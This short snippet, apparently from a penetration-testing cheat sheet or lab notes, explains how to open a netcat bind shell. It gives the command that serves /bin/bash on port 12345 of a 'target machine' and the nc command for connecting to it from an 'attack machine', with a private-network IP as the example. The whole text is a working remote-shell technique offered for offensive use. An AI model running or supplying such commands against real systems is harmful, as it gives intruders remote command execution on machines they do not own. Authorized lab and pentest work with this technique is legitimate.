## Open a netcat connection on the target machine
Run the following command on the target machine:
```
nc.traditional -l -p 12345 -e /bin/bash
```

Now you can connect to it by running the following command from your attack machine:
```
nc {target_machine_ip} 12345
```
Example:
```
$ nc 192.168.232.131 12345

```
